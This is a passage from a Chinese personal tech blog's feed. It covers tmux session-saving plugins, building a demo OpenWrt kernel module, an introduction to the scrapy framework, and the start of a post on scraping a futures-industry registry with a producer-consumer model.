<h2 id="解决配色问题"><a href="#解决配色问题" class="headerlink" title="解决配色问题"></a>解决配色问题</h2><p>在<code>tmux</code>中，有可能部分应用的配色与纯<code>shell</code>下不一致，尤其是<code>vim</code>，后来发现<code>htop</code>也存在这个问题。要解决很简单，在<code>tmux</code>配置中加上一句：</p>
<pre><code class="yml">set -g default-terminal &quot;screen-256color&quot;
</code></pre>
<h2 id="存储-恢复tmux工作环境"><a href="#存储-恢复tmux工作环境" class="headerlink" title="存储/恢复tmux工作环境"></a>存储/恢复tmux工作环境</h2><p>如果在服务器上使用<code>tmux</code>，由于服务器基本不关机，所以不用考虑<code>tmux</code>环境会丢失。但是在个人电脑上使用的话，重启电脑后<code>tmux</code>环境就丢失了，如果每次重启都要重新配置一遍环境的话，那未免太浪费时间了。所以这里推荐个插件<a href="https://github.com/tmux-plugins/tmux-resurrect" target="_blank" rel="noopener">tmux-resurrect</a></p>
<p><code>tmux-resurrect</code>可以对<code>tmux</code>环境进行保存和恢复，安装及配置如下：</p>
<pre><code class="zsh">$ mkdir ~/.tmux
$ git clone https://github.com/tmux-plugins/tmux-resurrect ~/.tmux/tmux-resurrect

# edit .tmux.conf at the bottom
$ vi ~/.tmux.conf
run-shell ~/.tmux/tmux-resurrect/resurrect.tmux

# re source .tmux.conf
$ tmux source-file ~/.tmux.conf
</code></pre>
<p><code>tmux-resurrect</code>用法:</p>
<ul>
<li><code>prefix + Ctrl-s</code> - save</li>
<li><code>prefix + Ctrl-r</code> - restore</li>
</ul>
<p>插件<code>tmux-resurrect</code>还可以结合插件<code>tmux-continum</code>一起使用，<code>tmux-continum</code>可以自动定时存储环境，在开机后打开<code>tmux</code>时自动恢复环境，这就避免了人为存储和恢复的麻烦以及因忘记存储导致的环境丢失。<code>tmux-continum</code>的安装及配置如下:</p>
<pre><code class="zsh">$ git clone https://github.com/tmux-plugins/tmux-continuum ~/.tmux/tmux-continum

# edit .tmux.conf
$ vi ~/.tmux.conf
set -g @continuum-restore &#39;on&#39;  # restore last saved env
set -g @continuum-save-interval &#39;30&#39;  # default is 15 minutes
run-shell ~/.tmux/tmux-continum/continuum.tmux

$ tmux source ~/.tmux.conf
</code></pre>
<p><strong>说明</strong>：</p>
<ol>
<li>以上两个插件都是手动安装的，其实也可以使用<code>tmux</code>的插件管理器<a href="https://github.com/tmux-plugins/tpm" target="_blank" rel="noopener">tpm</a>进行安装，这里就不详述了。</li>
<li>以上插件要求<code>tmux</code>版本大等于<code>1.9</code></li>
</ol>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
<li><a href="https://linuxtoy.org/archives/tmux-resurrect-and-continuum.html" target="_blank" rel="noopener">https://linuxtoy.org/archives/tmux-resurrect-and-continuum.html</a></li>
<li><a href="https://github.com/tmux/tmux" target="_blank" rel="noopener">https://github.com/tmux/tmux</a></li>
<li><a href="https://github.com/tmux-plugins/tpm" target="_blank" rel="noopener">https://github.com/tmux-plugins/tpm</a></li>
<li><a href="https://github.com/tmux-plugins/tmux-resurrect" target="_blank" rel="noopener">https://github.com/tmux-plugins/tmux-resurrect</a></li>
<li><a href="https://github.com/tmux-plugins/tmux-continuum" target="_blank" rel="noopener">https://github.com/tmux-plugins/tmux-continuum</a></li>
</ul>
]]></content>
      
        <categories>
            
            <category> Linux </category>
            
        </categories>
        
        
        <tags>
            
            <tag> ubuntu </tag>
            
            <tag> tmux </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Openwrt中添加内核模块]]></title>
      <url>https://www.litreily.top/2018/05/30/openwrt-ko/</url>
      <content type="html"><![CDATA[<p>如果想要在<code>Openwrt</code>系统中添加一个内核模块，其实并不难，对着某个已有的内核模块，依葫芦画瓢嘛，不难。本文将介绍一个最最简单的</p>
<h2 id="sourcecode"><a href="#sourcecode" class="headerlink" title="sourcecode"></a>sourcecode</h2><p>path: <code>git_repo/package/kmod-demo/</code></p>
<p>下面是源码包含的所有文件，根级<code>Makefile</code>提供给内核编译器使用，<code>src</code>级<code>Makefile</code>用于编译<code>.ko</code>文件。</p>
<pre><code class="txt">$ tree
.
├── Makefile
└── src
    ├── demo.c
    ├── Kconfig
    └── Makefile
</code></pre>
<h3 id="demo-c"><a href="#demo-c" class="headerlink" title="demo.c"></a>demo.c</h3><p>源码非常简单，在装载时打印<code>Hello World</code>，卸载时打印<code>Exit</code>。</p>
<pre><code class="c">#include &lt;linux/module.h&gt;
#include &lt;linux/kernel.h&gt;

static int __init hello_init(void)
{
    printk(&quot;Hello World\n&quot;);
    return 0;
}

static void __exit hello_exit(void)
{
    printk(&quot;Exit\n&quot;);
}

module_init(hello_init);
module_exit(hello_exit);
MODULE_LICENSE(&quot;GPL&quot;);
MODULE_AUTHOR(&quot;Guangtao.wu&quot;);
</code></pre>
<h3 id="Kconfig"><a href="#Kconfig" class="headerlink" title="Kconfig"></a>Kconfig</h3><p>在<code>Kconfig</code>文件中添加一些编译相关的选项</p>
<pre><code class="json">config DEMO
    tristate &quot;This is a Module_DEMO&quot;
    default n
    help
      This is a DEMO, for debugging kernel model.
      If unsure, say N.
</code></pre>
<ul>
<li><code>default</code> : 该选项的默认值<ul>
<li><code>n</code> 不编译</li>
<li><code>y</code> 编译到内核，启动时自动加载</li>
<li><code>m</code> 编译生成<code>.ko</code>模块，不自动加载，需使用<code>insmod</code>加载</li>
</ul>
</li>
</ul>
<h3 id="Root-Makefile"><a href="#Root-Makefile" class="headerlink" title="Root - Makefile"></a>Root - Makefile</h3><p>根级<code>Makefile</code>仿其它内核模块编写，注意替换名称<code>demo</code>，<code>SUBMENU</code>以及<code>TITLE</code>将显示在<code>make menuconfig</code>的交互界面中。</p>
<pre><code class="makefile">#
# Copyright (C) 2006 OpenWrt.org
#
# This is free software, licensed under the GNU General Public License v2.
# See /LICENSE for more information.
#
# $Id: Makefile 6565 2007-03-14 13:42:21Z nbd $

include $(TOPDIR)/rules.mk
include $(INCLUDE_DIR)/kernel.mk

PKG_NAME:=demo
PKG_RELEASE:=1

PKG_BUILD_DIR:=$(KERNEL_BUILD_DIR)/$(PKG_NAME)

include $(INCLUDE_DIR)/package.mk

define KernelPackage/demo
  SUBMENU:=Other modules
  TITLE:=kernel demo
  VERSION:=$(LINUX_VERSION)-$(BOARD)-$(PKG_RELEASE)
  FILES:= $(PKG_BUILD_DIR)/demo.$(LINUX_KMOD_SUFFIX)
  AUTOLOAD:=$(call AutoLoad,46,demo)
endef

define Build/Prepare
  mkdir -p $(PKG_BUILD_DIR)
  $(CP) ./src/* $(PKG_BUILD_DIR)
endef

define Build/Compile
  $(MAKE) -C &quot;$(LINUX_DIR)&quot; \
    CROSS_COMPILE=&quot;$(TARGET_CROSS)&quot; \
    ARCH=&quot;$(LINUX_KARCH)&quot; \
    SUBDIRS=&quot;$(PKG_BUILD_DIR)&quot; \
    EXTRA_CFLAGS=&quot;$(BUILDFLAGS)&quot; \
    modules
endef

define KernelPackage/demo/install
  $(INSTALL_DIR) $(1)/lib/network/
endef

$(eval $(call KernelPackage,demo))
</code></pre>
<h3 id="src-Makefile"><a href="#src-Makefile" class="headerlink" title="src - Makefile"></a>src - Makefile</h3><p>源码的<code>Makefile</code>很简单，其实只要一行就够了，其中<code>CONFIG_&lt;module_name&gt;</code>需要在后续<code>.config</code>文件中配置，或者直接将<code>$(CONFIG_DEMO)</code>改为<code>y</code>或<code>m</code>即可。</p>
<pre><code class="Makefile">obj ?= .

obj-$(CONFIG_DEMO) += demo.o
</code></pre>
<h2 id="更新-config"><a href="#更新-config" class="headerlink" title="更新 .config"></a>更新 .config</h2><p>使用<code>make menuconfig</code>或者直接修改配置文件<code>.config</code>可以启用新添加的内核模块。</p>
<ol>
<li><code>make menuconfig</code>: 搜索<code>demo</code>将其选中然后保存退出</li>
<li>手动启用，修改<code>.config</code>，在<code>Others module</code>配置参数附近添加如下内容</li>
</ol>
<pre><code class="c">CONFIG_KERNEL_kmod_demo=y
</code></pre>
<h2 id="make"><a href="#make" class="headerlink" title="make"></a>make</h2><p>当源码和配置选项都准备好后，便可以编译安装了，单独安装需要整个<code>kernel</code>已经编译过一次，以保证交叉编译工具链能够正常使用。</p>
<pre><code class="sh">make package/kmod-demo/compile V=s
make package/kmod-demo/install V=s
</code></pre>
<h2 id="insmod-rmmod"><a href="#insmod-rmmod" class="headerlink" title="insmod/rmmod"></a>insmod/rmmod</h2><pre><code class="sh"># insmod
$ insmod demo.ko
Hello World

# rmmod
$ rmmod demo.ko
Exit
</code></pre>
<p>look, <code>printk</code>的信息已经成功打印出来了！</p>
]]></content>
      
        <categories>
            
            <category> Embedded </category>
            
        </categories>
        
        
        <tags>
            
            <tag> C/C++ </tag>
            
            <tag> linux </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Python网络爬虫4 - scrapy入门]]></title>
      <url>https://www.litreily.top/2018/05/27/scrapy-start/</url>
      <content type="html"><![CDATA[<p><code>scrapy</code>作为一款强大的爬虫框架，当然要好好学习一番，本文便是本人学习和使用<code>scrapy</code>过后的一个总结，内容比较基础，算是入门笔记吧，主要讲述<code>scrapy</code>的基本概念和使用方法。</p>
<h2 id="scrapy-framework"><a href="#scrapy-framework" class="headerlink" title="scrapy framework"></a>scrapy framework</h2><p>首先附上<code>scrapy</code>经典图如下：</p>
<p><img src="/assets/spider/scrapy/scrapy.jpg" alt="scrapy framework"></p>
<p><code>scrapy</code>框架包含以下几个部分</p>
<ol>
<li><code>Scrapy Engine</code> 引擎</li>
<li><code>Spiders</code> 爬虫</li>
<li><code>Scheduler</code> 调度器</li>
<li><code>Downloader</code> 下载器</li>
<li><code>Item Pipeline</code> 项目管道</li>
<li><code>Downloader Middlewares</code> 下载器中间件</li>
<li><code>Spider Middlewares</code> 爬虫中间件</li>
</ol>
<h3 id="spider-process"><a href="#spider-process" class="headerlink" title="spider process"></a>spider process</h3><p>其爬取过程简述如下：</p>
<ol>
<li>引擎从爬虫获取首个待爬取的链接<code>url</code>，并传递给调度器</li>
<li>调度器将链接存入队列</li>
<li>引擎向调度器请求要爬取的链接，并将请求得到的链接经下载器中间件传递给下载器</li>
<li>下载器从网上下载网页，下载后的网页经下载器中间件传递给引擎</li>
<li>引擎将网页经爬虫中间件传递给爬虫</li>
<li>爬虫对网页进行解析，将得到的<code>Items</code>和新的链接经爬虫中间件交给引擎</li>
<li>引擎将从爬虫得到的<code>Items</code>交给项目管道，将新的链接请求<code>requests</code>交给调度器</li>
<li>此后循环2~7步，直到没有待爬取的链接为止</li>
</ol>
<p>需要说明的是，项目管道(<code>Item Pipeline</code>)主要完成数据清洗，验证，持久化存储等工作；下载器中间件(<code>Downloader Middlewares</code>)作为下载器和引擎之间的的钩子(<code>hook</code>)，用于监听或修改下载请求或已下载的网页，比如修改请求包的头部信息等；爬虫中间件(<code>Spider Middlewares</code>)作为爬虫和引擎之间的钩子(<code>hook</code>)，用于处理爬虫的输入输出，即网页<code>response</code>和爬虫解析网页后得到的<code>Items</code>和<code>requests</code>。</p>
<h3 id="Items"><a href="#Items" class="headerlink" title="Items"></a>Items</h3><p>至于什么是<code>Items</code>，个人认为就是经爬虫解析后得到的一个数据单元，包含一组数据，比如爬取的是某网站的商品信息，那么每爬取一个网页可能会得到多组商品信息，每组信息包含商品名称，价格，生产日期，商品样式等，那我们便可以定义一组<code>Item</code></p>
<pre><code class="python">from scrapy.item import Item
from scrapy.item import Field

class GoodsItem(Item):
    name = Field()
    price = Field()
    date = Field()
    types = Field()
</code></pre>
<p><code>Field()</code>实质就是一个字典<code>Dict()</code>类型的扩展，如上代码所示，一组<code>Item</code>对应一个商品信息，单个网页可能包含一个或多个商品，所有<code>Item</code>信息都需要在<code>Spider</code>中赋值，然后经引擎交给<code>Item Pipeline</code>。具体实现在后续博文的实例中会有体现，本文旨在简单记述<code>scrapy</code>的基本概念和使用方法。</p>
<h2 id="Install"><a href="#Install" class="headerlink" title="Install"></a>Install</h2><p>with <code>pip</code></p>
<pre><code class="node">pip install scrapy
</code></pre>
<p>or <code>conda</code></p>
<pre><code class="node">conda install -c conda-forge scrapy
</code></pre>
<p>基本指令如下：</p>
<pre><code class="js">D:\WorkSpace&gt;scrapy --help
Scrapy 1.5.0 - no active project

Usage:
  scrapy &lt;command&gt; [options] [args]

Available commands:
  bench         Run quick benchmark test
  fetch         Fetch a URL using the Scrapy downloader
  genspider     Generate new spider using pre-defined templates
  runspider     Run a self-contained spider (without creating a project)
  settings      Get settings values
  shell         Interactive scraping console
  startproject  Create new project
  version       Print Scrapy version
  view          Open URL in browser, as seen by Scrapy

  [ more ]      More commands available when run from project directory

Use &quot;scrapy &lt;command&gt; -h&quot; to see more info about a command
</code></pre>
<p>如果需要使用虚拟环境，需要安装<code>virtualenv</code></p>
<pre><code class="node">pip install virtualenv
</code></pre>
<h2 id="scrapy-startproject"><a href="#scrapy-startproject" class="headerlink" title="scrapy startproject"></a>scrapy startproject</h2><pre><code class="sh">scrapy startproject &lt;project-name&gt; [project-dir]
</code></pre>
<p>使用该指令可以生成一个新的<code>scrapy</code>项目，以<code>demo</code>为例</p>
<pre><code class="sh">$ scrapy startproject demo
...
You can start your first spider with:
    cd demo
    scrapy genspider example example.com

$ cd demo
$ tree
.
├── demo
│   ├── __init__.py
│   ├── items.py
│   ├── middlewares.py
│   ├── pipelines.py
│   ├── __pycache__
│   ├── settings.py
│   └── spiders
│       ├── __init__.py
│       └── __pycache__
└── scrapy.cfg

4 directories, 7 files
</code></pre>
<p>可以看到<code>startproject</code>自动生成了一些文件夹和文件，其中：</p>
<ol>
<li><code>scrapy.cfg</code>: 项目配置文件，一般不用修改</li>
<li><code>items.py</code>: 定义<code>items</code>的文件，例如上述的<code>GoodsItem</code></li>
<li><code>middlewares.py</code>: 中间件代码，默认包含下载器中间件和爬虫中间件</li>
<li><code>pipelines.py</code>: 项目管道，用于处理<code>spider</code>返回的<code>items</code>，包括清洗，验证，持久化等</li>
<li><code>settings.py</code>: 全局配置文件，包含各类全局变量</li>
<li><code>spiders</code>: 该文件夹用于存储所有的爬虫文件，注意一个项目可以包含多个爬虫</li>
<li><code>__init__.py</code>: 该文件指示当前文件夹属于一个<code>python</code>模块</li>
<li><code>__pycache__</code>: 存储解释器生成的<code>.pyc</code>文件（一种跨平台的字节码<code>byte code</code>），在<code>python2</code>中该类文件与<code>.py</code>保存在相同文件夹</li>
</ol>
<h2 id="scrapy-genspider"><a href="#scrapy-genspider" class="headerlink" title="scrapy genspider"></a>scrapy genspider</h2><p>项目生成以后，可以使用<code>scrapy genspider</code>指令自动生成一个爬虫文件，比如，如果要爬取<a href="www.huaban.com">花瓣网首页</a>，执行以下指令：</p>
<pre><code class="sh">cd demo
scrapy genspider huaban www.huaban.com
</code></pre>
<p>默认生成的爬虫文件<code>huaban.py</code>如下：</p>
<pre><code class="python"># -*- coding: utf-8 -*-
import scrapy


class HuabanSpider(scrapy.Spider):
    name = &#39;huaban&#39;
    allowed_domains = [&#39;www.huaban.com&#39;]
    start_urls = [&#39;http://www.huaban.com/&#39;]

    def parse(self, response):
        pass
</code></pre>
<ul>
<li>爬虫类继承于<code>scrapy.Spider</code></li>
<li><code>name</code>是必须存在的参数，用以标识该爬虫</li>
<li><code>allowed_domains</code>指代允许爬虫爬取的域名，指定域名之外的链接将被丢弃</li>
<li><code>start_urls</code>存储爬虫的起始链接，该参数是列表类型，所以可以同时存储多个链接</li>
</ul>
<p>如果要自定义起始链接，也可以重写<code>scrapy.Spider</code>类的<code>start_requests</code>函数，此处不予细讲。</p>
<p><code>parse</code>函数是一个默认的回调函数，当下载器下载网页后，会调用该函数进行解析，<code>response</code>就是请求包的响应数据。至于网页内容的解析方法，<code>scrapy</code>内置了几种选择器(<code>Selector</code>)，包括<code>xpath</code>选择器、<code>CSS</code>选择器和正则匹配。下面是一些选择器的使用示例，方便大家更加直观的了解选择器的用法。</p>
<pre><code class="python"># xpath selector
response.xpath(&#39;//a&#39;)
response.xpath(&#39;./img&#39;).extract()
response.xpath(&#39;//*[@id=&quot;huaban&quot;]&#39;).extract_first()
repsonse.xpath(&#39;//*[@id=&quot;Profile&quot;]/div[1]/a[2]/text()&#39;).extract_first()

# css selector
response.css(&#39;a&#39;).extract()
response.css(&#39;#Profile &gt; div.profile-basic&#39;).extract_first()
response.css(&#39;a[href=&quot;test.html&quot;]::text&#39;).extract_first()

# re selector
response.xpath(&#39;.&#39;).re(&#39;id:\s*(\d+)&#39;)
response.xpath(&#39;//a/text()&#39;).re_first(&#39;username: \s(.*)&#39;)
</code></pre>
<p>需要说明的是，<code>response</code>不能直接调用<code>re</code>,<code>re_first</code>.</p>
<h2 id="scrapy-crawl"><a href="#scrapy-crawl" class="headerlink" title="scrapy crawl"></a>scrapy crawl</h2><p>假设爬虫编写完了，那就可以使用<code>scrapy crawl</code>指令开始执行爬取任务了。</p>
<p>当进入一个创建好的<code>scrapy</code>项目目录时，使用<code>scrapy -h</code>可以获得相比未创建之前更多的帮助信息，其中就包括用于启动爬虫任务的<code>scrapy crawl</code></p>
<pre><code class="sh">$ scrapy -h
Scrapy 1.5.0 - project: huaban

Usage:
  scrapy &lt;command&gt; [options] [args]

Available commands:
  bench         Run quick benchmark test
  check         Check spider contracts
  crawl         Run a spider
  edit          Edit spider
  fetch         Fetch a URL using the Scrapy downloader
  genspider     Generate new spider using pre-defined templates
  list          List available spiders
  parse         Parse URL (using its spider) and print the results
  runspider     Run a self-contained spider (without creating a project)
  settings      Get settings values
  shell         Interactive scraping console
  startproject  Create new project
  version       Print Scrapy version
  view          Open URL in browser, as seen by Scrapy

Use &quot;scrapy &lt;command&gt; -h&quot; to see more info about a command
</code></pre>
<pre><code class="sh">$ scrapy crawl -h
Usage
=====
  scrapy crawl [options] &lt;spider&gt;

Run a spider

Options
=======
--help, -h              show this help message and exit
-a NAME=VALUE           set spider argument (may be repeated)
--output=FILE, -o FILE  dump scraped items into FILE (use - for stdout)
--output-format=FORMAT, -t FORMAT
                        format to use for dumping items with -o

Global Options
--------------
--logfile=FILE          log file. if omitted stderr will be used
--loglevel=LEVEL, -L LEVEL
                        log level (default: DEBUG)
--nolog                 disable logging completely
--profile=FILE          write python cProfile stats to FILE
--pidfile=FILE          write process ID to FILE
--set=NAME=VALUE, -s NAME=VALUE
                        set/override setting (may be repeated)
--pdb                   enable pdb on failure
</code></pre>
<p>从<code>scrapy crawl</code>的帮助信息可以看出，该指令包含很多可选参数，但必选参数只有一个，就是<code>spider</code>，即要执行的爬虫名称，对应每个爬虫的名称(<code>name</code>)。</p>
<pre><code class="sh">scrapy crawl huaban
</code></pre>
<p>至此，一个<code>scrapy</code>爬虫任务的创建和执行过程就介绍完了，至于实例，后续博客会陆续介绍。</p>
<h2 id="scrapy-shell"><a href="#scrapy-shell" class="headerlink" title="scrapy shell"></a>scrapy shell</h2><p>最后简要说明一下指令<code>scrapy shell</code>，这是一个交互式的<code>shell</code>,类似于命令行形式的<code>python</code>，当我们刚开始学习<code>scrapy</code>或者刚开始爬取某个陌生的站点时，可以使用它熟悉各种函数操作或者选择器的使用，用它来不断试错纠错，熟练掌握<code>scrapy</code>各种用法。</p>
<pre><code class="sh">$ scrapy shell www.huaban.com
2018-05-29 23:58:49 [scrapy.utils.log] INFO: Scrapy 1.5.0 started (bot: scrapybot)
2018-05-29 23:58:49 [scrapy.utils.log] INFO: Versions: lxml 4.2.1.0, libxml2 2.9.5, cssselect 1.0.3, parsel 1.4.0, w3lib 1.19.0, Twisted 17.9.0, Python 3.6.3 (v3.6.3:2c5fed8, Oct  3
2017, 17:26:49) [MSC v.1900 32 bit (Intel)], pyOpenSSL 17.5.0 (OpenSSL 1.1.0h  27 Mar 2018), cryptography 2.2.2, Platform Windows-10-10.0.17134-SP0
2018-05-29 23:58:49 [scrapy.crawler] INFO: Overridden settings: {&#39;DUPEFILTER_CLASS&#39;: &#39;scrapy.dupefilters.BaseDupeFilter&#39;, &#39;LOGSTATS_INTERVAL&#39;: 0}
2018-05-29 23:58:49 [scrapy.middleware] INFO: Enabled extensions:
[&#39;scrapy.extensions.corestats.CoreStats&#39;,
 &#39;scrapy.extensions.telnet.TelnetConsole&#39;]
2018-05-29 23:58:50 [scrapy.middleware] INFO: Enabled downloader middlewares:
[&#39;scrapy.downloadermiddlewares.httpauth.HttpAuthMiddleware&#39;,
 &#39;scrapy.downloadermiddlewares.downloadtimeout.DownloadTimeoutMiddleware&#39;,
 &#39;scrapy.downloadermiddlewares.defaultheaders.DefaultHeadersMiddleware&#39;,
 &#39;scrapy.downloadermiddlewares.useragent.UserAgentMiddleware&#39;,
 &#39;scrapy.downloadermiddlewares.retry.RetryMiddleware&#39;,
 &#39;scrapy.downloadermiddlewares.redirect.MetaRefreshMiddleware&#39;,
 &#39;scrapy.downloadermiddlewares.httpcompression.HttpCompressionMiddleware&#39;,
 &#39;scrapy.downloadermiddlewares.redirect.RedirectMiddleware&#39;,
 &#39;scrapy.downloadermiddlewares.cookies.CookiesMiddleware&#39;,
 &#39;scrapy.downloadermiddlewares.httpproxy.HttpProxyMiddleware&#39;,
 &#39;scrapy.downloadermiddlewares.stats.DownloaderStats&#39;]
2018-05-29 23:58:50 [scrapy.middleware] INFO: Enabled spider middlewares:
[&#39;scrapy.spidermiddlewares.httperror.HttpErrorMiddleware&#39;,
 &#39;scrapy.spidermiddlewares.offsite.OffsiteMiddleware&#39;,
 &#39;scrapy.spidermiddlewares.referer.RefererMiddleware&#39;,
 &#39;scrapy.spidermiddlewares.urllength.UrlLengthMiddleware&#39;,
 &#39;scrapy.spidermiddlewares.depth.DepthMiddleware&#39;]
2018-05-29 23:58:50 [scrapy.middleware] INFO: Enabled item pipelines:
[]
2018-05-29 23:58:50 [scrapy.extensions.telnet] DEBUG: Telnet console listening on 127.0.0.1:6023
2018-05-29 23:58:50 [scrapy.core.engine] INFO: Spider opened
2018-05-29 23:58:50 [scrapy.downloadermiddlewares.redirect] DEBUG: Redirecting (301) to &lt;GET http://huaban.com/&gt; from &lt;GET http://www.huaban.com&gt;
2018-05-29 23:58:50 [scrapy.core.engine] DEBUG: Crawled (200) &lt;GET http://huaban.com/&gt; (referer: None)
[s] Available Scrapy objects:
[s]   scrapy     scrapy module (contains scrapy.Request, scrapy.Selector, etc)
[s]   crawler    &lt;scrapy.crawler.Crawler object at 0x03385CB0&gt;
[s]   item       {}
[s]   request    &lt;GET http://www.huaban.com&gt;
[s]   response   &lt;200 http://huaban.com/&gt;
[s]   settings   &lt;scrapy.settings.Settings object at 0x04CC4D10&gt;
[s]   spider     &lt;DefaultSpider &#39;default&#39; at 0x4fa6bf0&gt;
[s] Useful shortcuts:
[s]   fetch(url[, redirect=True]) Fetch URL and update local objects (by default, redirects are followed)
[s]   fetch(req)                  Fetch a scrapy.Request and update local objects
[s]   shelp()           Shell help (print this help)
[s]   view(response)    View response in a browser
In [1]: view(response)
Out[1]: True

In [2]: response.xpath(&#39;//a&#39;)
Out[2]:
[&lt;Selector xpath=&#39;//a&#39; data=&#39;&lt;a id=&quot;elevator&quot; class=&quot;off&quot; onclick=&quot;re&#39;&gt;,
 &lt;Selector xpath=&#39;//a&#39; data=&#39;&lt;a class=&quot;plus&quot;&gt;&lt;/a&gt;&#39;&gt;,
 &lt;Selector xpath=&#39;//a&#39; data=&#39;&lt;a onclick=&quot;app.showUploadDialog();&quot;&gt;添加采&#39;&gt;,
 &lt;Selector xpath=&#39;//a&#39; data=&#39;&lt;a class=&quot;add-board-item&quot;&gt;添加画板&lt;i class=&quot;&#39;&gt;,
 &lt;Selector xpath=&#39;//a&#39; data=&#39;&lt;a href=&quot;/about/goodies/&quot;&gt;安装采集工具&lt;i class&#39;&gt;,
 &lt;Selector xpath=&#39;//a&#39; data=&#39;&lt;a class=&quot;huaban_security_oauth&quot; logo_si&#39;&gt;]

In [3]: response.xpath(&#39;//a&#39;).extract()
Out[3]:
[&#39;&lt;a id=&quot;elevator&quot; class=&quot;off&quot; onclick=&quot;return false;&quot; title=&quot;回到顶部&quot;&gt;&lt;/a&gt;&#39;,
 &#39;&lt;a class=&quot;plus&quot;&gt;&lt;/a&gt;&#39;,
 &#39;&lt;a onclick=&quot;app.showUploadDialog();&quot;&gt;添加采集&lt;i class=&quot;upload&quot;&gt;&lt;/i&gt;&lt;/a&gt;&#39;,
 &#39;&lt;a class=&quot;add-board-item&quot;&gt;添加画板&lt;i class=&quot;add-board&quot;&gt;&lt;/i&gt;&lt;/a&gt;&#39;,
 &#39;&lt;a href=&quot;/about/goodies/&quot;&gt;安装采集工具&lt;i class=&quot;goodies&quot;&gt;&lt;/i&gt;&lt;/a&gt;&#39;,
 &#39;&lt;a class=&quot;huaban_security_oauth&quot; logo_size=&quot;124x47&quot; logo_type=&quot;realname&quot; href=&quot;//www.anquan.org&quot; rel=&quot;nofollow&quot;&gt; &lt;script src=&quot;//static.anquan.org/static/outer/js/aq_auth.js&quot;&gt;&lt;/script&gt; &lt;/a&gt;&#39;]

In [4]: response.xpath(&#39;//img&#39;)
Out[4]: [&lt;Selector xpath=&#39;//img&#39; data=&#39;&lt;img src=&quot;https://d5nxst8fruw4z.cloudfro&#39;&gt;]

In [5]: response.xpath(&#39;//a/text()&#39;)
Out[5]:
[&lt;Selector xpath=&#39;//a/text()&#39; data=&#39;添加采集&#39;&gt;,
 &lt;Selector xpath=&#39;//a/text()&#39; data=&#39;添加画板&#39;&gt;,
 &lt;Selector xpath=&#39;//a/text()&#39; data=&#39;安装采集工具&#39;&gt;,
 &lt;Selector xpath=&#39;//a/text()&#39; data=&#39; &#39;&gt;,
 &lt;Selector xpath=&#39;//a/text()&#39; data=&#39; &#39;&gt;]

In [6]: response.xpath(&#39;//a/text()&#39;).extract()
Out[6]: [&#39;添加采集&#39;, &#39;添加画板&#39;, &#39;安装采集工具&#39;, &#39; &#39;, &#39; &#39;]

In [7]: response.xpath(&#39;//a/text()&#39;).extract_first()
Out[7]: &#39;添加采集&#39;
</code></pre>
]]></content>
      
        <categories>
            
            <category> Python </category>
            
        </categories>
        
        
        <tags>
            
            <tag> spider </tag>
            
            <tag> scrapy </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Python网络爬虫3 - 生产者消费者模型爬取某金融网站数据]]></title>
      <url>https://www.litreily.top/2018/04/30/cfachina/</url>
      <content type="html"><![CDATA[<p>应一位金融圈的朋友所托，帮忙写个爬虫，帮他爬取<a href="http://www.cfachina.org/cfainfo/organbaseinfoServlet?all=personinfo#" target="_blank" rel="noopener">中国期货行业协议</a>网站中所有金融机构的从业人员信息。网站数据的获取本身比较简单，但是为了学习一些新的爬虫方法和技巧，即本文要讲述的<strong>生产者消费者模型</strong>，我又学习了一下Python中队列库<code>queue</code>及线程库<code>Thread</code>的使用方法。</p>
<h2 id="生产者消费者模型"><a href="#生产者消费者模型" class="headerlink" title="生产者消费者模型"></a>生产者消费者模型</h2><p>生产者消费者模型非常简单，相信大部分程序员都知道，就是一方作为生产者不断提供资源，另一方作为消费者不断消费资源。简单点说，就好比餐馆的厨师和顾客，厨师作为生产者不断制作美味的食物，而顾客作为消费者不断食用厨师提供的食物。此外，生产者与消费者之间可以是一对一、一对多、多对一和多对多的关系。</p>
<p>那么这个模型和爬虫有什么关系呢？其实，爬虫可以认为是一个生产者，它不断从网站爬取数据，爬取到的数据就是食物；而所得数据需要消费者进行数据清洗，把有用的数据吸收掉，把无用的数据丢弃。</p>
<p>在实践过程中，爬虫爬取和数据清洗分别对应一个<code>Thread</code>，两个线程之间通过顺序队列<code>queue</code>传递数据，数据传递过程就好比餐馆服务员从厨房把食物送到顾客餐桌上的过程。爬取线程负责爬取网站数据，并将原始数据存入队列，清洗线程从队列中按入队顺序读取原始数据并提取出有效数据。</p>
<p>以上便是对生产者消费者模型的简单介绍了，下面针对本次爬取任务予以详细说明。</p>
<h2 id="分析站点"><a href="#分析站点" class="headerlink" title="分析站点"></a>分析站点</h2><blockquote>
<p><a href="http://www.cfachina.org/cfainfo/organbaseinfoServlet?all=personinfo" target="_blank" rel="noopener">http://www.cfachina.org/cfainfo/organbaseinfoServlet?all=personinfo</a></p>
</blockquote>
<p><img src="/assets/spider/cfachina/home_page.png" alt="home page"></p>
<p>我们要爬取的数据是主页显示的表格中所有期货公司的<strong>从业人员信息</strong>，每个公司对应一个<strong>机构编号</strong>(<code>G01001~G01198</code>)。从上图可以看到有主页有分页，共8页。以<code>G01001</code>方正中期期货公司为例，点击该公司名称跳转至对应网页如下:</p>
<p><img src="/assets/spider/cfachina/personinfo.png" alt="personinfo"></p>
<p>从网址及网页内容可以提取出以下信息：</p>
<ol>
<li>网址<ul>
<li><a href="http://www.cfachina.org/cfainfo/organbaseinfoOneServlet?organid=+G01001+&amp;currentPage=1&amp;pageSize=20&amp;selectType=personinfo" target="_blank" rel="noopener">http://www.cfachina.org/cfainfo/organbaseinfoOneServlet?organid=+G01001+&amp;currentPage=1&amp;pageSize=20&amp;selectType=personinfo</a><ul>
<li><code>organid</code>: 机构编号，<code>+G01001+</code> ~ <code>+G01198+</code></li>
<li><code>currentPage</code>: 该机构从业人员信息当前页面编号</li>
<li><code>pageSize</code>: 每个页面显示的人员个数，默认20</li>
<li><code>selectType</code>: 固定为<code>personinfo</code></li>
</ul>
</li>
</ul>
</li>
<li>机构名称<code>mechanism_name</code>，在每页表格上方可以看到当前机构名称</li>
<li>从业人员信息，即每页的表格内容，也是我们要爬取的对象</li>
<li>该机构从业人员信息总页数<code>page_cnt</code></li>
</ol>
<p>我们最终爬取的数据可以按机构名称存储到对应的txt文件或excel文件中。</p>
<h3 id="获取机构名称"><a href="#获取机构名称" class="headerlink" title="获取机构名称"></a>获取机构名称</h3><p><img src="/assets/spider/cfachina/gst_title.png" alt="get mechanism name"></p>
